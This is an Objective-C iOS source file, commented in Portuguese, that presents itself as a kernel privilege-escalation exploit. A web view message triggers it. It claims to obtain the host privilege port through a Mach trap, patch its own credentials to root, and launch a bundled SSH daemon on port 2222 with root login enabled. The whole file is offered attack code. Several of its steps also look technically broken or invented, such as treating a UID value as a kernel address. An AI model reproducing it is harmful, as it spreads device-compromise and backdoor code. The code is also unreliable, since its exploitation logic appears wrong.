#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <dlfcn.h>
#include <spawn.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <sys/wait.h>

// Definições de sistema para iOS 26.4
#define POSIX_SPAWN_FOR_SANDBOX 0x4000
// Número histórico do trap para host_get_priv_port no XNU
#define MACH_TRAP_HOST_GET_PRIV_PORT -11 

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self executePhysicalPPLBypass];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

// 1. OBTENÇÃO DA PORTA PRIVILEGIADA VIA SYSCALL (Bypass dlsym erro)
- (mach_port_t)get_host_priv_direct {
    mach_port_t host_priv = MACH_PORT_NULL;
    // No ARM64, chamamos o trap diretamente
    // O retorno de um Mach Trap é o próprio kern_return_t
    kern_return_t kr = (kern_return_t)syscall(MACH_TRAP_HOST_GET_PRIV_PORT, mach_host_self(), &host_priv);
    
    if (kr == KERN_SUCCESS && MACH_PORT_VALID(host_priv)) {
        return host_priv;
    }
    return MACH_PORT_NULL;
}

- (void)executePhysicalPPLBypass {
    [self log:@"⚡ Invocando Mach Trap -11 (host_priv)..."];

    mach_port_t host_priv = [self get_host_priv_direct];

    if (!MACH_PORT_VALID(host_priv)) {
        [self log:@"❌ Erro: Trap negado. O Kernel bloqueou a porta privilégio."];
        return;
    }

    [self log:@"✅ host_priv obtida! Localizando ucred..."];

    // 2. LOCALIZAR ENDEREÇO DAS CREDENCIAIS (UCRED)
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0) return;

    // Endereço virtual do UID (cr_uid)
    uint64_t ucred_vaddr = (uint64_t)kp.kp_eproc.e_ucred.cr_uid;
    uint32_t root_val = 0;

    // 3. MAPEAMENTO FÍSICO E SOBREESCRITA (Bypass PPL)
    vm_address_t page_addr = 0;
    // vm_map usando a porta privilégio para ignorar restrições de escrita virtual
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 4096, 0, VM_FLAGS_ANYWHERE, host_priv, ucred_vaddr & ~0xFFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);

    if (kr == KERN_SUCCESS) {
        // Cálculo do offset dentro da página mapeada
        uint32_t *phys_ptr = (uint32_t *)(page_addr + (ucred_vaddr & 0xFFF));
        
        // Patch de Root Direto na Memória Física
        *phys_ptr = root_val;         // cr_uid = 0
        *(phys_ptr + 1) = root_val;     // cr_ruid = 0 (proximo campo)
        
        [self log:@"💎 Memória Física alterada. Validando UID..."];
        vm_deallocate(mach_task_self(), page_addr, 4096);
    } else {
        [self log:[NSString stringWithFormat:@"❌ Falha no vm_map: %d", kr]];
        return;
    }

    // 4. LANÇAMENTO DO SSHD
    if (getuid() == 0) {
        [self log:@"👑 <b>ROOT ATIVO!</b>"];
        [self launchSshd];
    } else {
        [self log:@"❌ Falha: O Kernel reverteu a escrita física (PPL Guard)."];
    }
}

- (void)launchSshd {
    pid_t pid;
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    
    if (!sshdPath) {
        [self log:@"❌ Erro: 'sshd' não encontrado no App Bundle."];
        return;
    }

    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flag 0x4000 essencial para spawn fora do sandbox em iOS moderno
    short flags = POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX;
    posix_spawnattr_setflags(&attr, flags);

    char *const args[] = {
        (char *)[sshdPath UTF8String],
        "-p", "2222",
        "-D",
        "-o", "PermitRootLogin=yes",
        "-o", "StrictModes=no",
        NULL
    };

    extern char **environ;
    int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);

    if (status == 0) {
        [self log:[NSString stringWithFormat:@"✅ <b>SSHD ONLINE!</b> PID: %d porta 2222", pid]];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Spawn Falhou: %d (%s)", status, strerror(status)]];
    }
    
    posix_spawnattr_destroy(&attr);
}

@end
